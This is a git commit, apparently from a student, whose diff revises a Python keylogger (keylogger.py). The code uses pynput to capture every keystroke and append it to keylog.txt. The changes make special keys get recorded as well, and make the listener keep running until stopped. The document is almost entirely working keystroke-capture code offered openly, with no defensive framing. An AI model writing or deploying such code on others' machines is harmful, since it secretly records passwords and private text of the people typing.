55730410051e3a26f3aa469ab728f33cf9354cfd
Ginwin Quicay <gilastrollo@my.cspc.edu.ph>
2026-01-11 14:54:32 +0800

    modified

--- keylogger.py
+++ keylogger.py
@@ -2,14 +2,13 @@ from pynput import keyboard
 
 def keyPressed(key):
     print(str(key))
-    with open("keylog.txt", 'a') as logkey:
+    with open("keylog.txt", "a") as logkey:
         try:
-            char = key.char
-            logkey.write(char)
-        except:
-            print("Error getting char")
+            logkey.write(key.char)
+        except AttributeError:
+            logkey.write(f"[{key}]")
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
-    input()
+    listener.join()
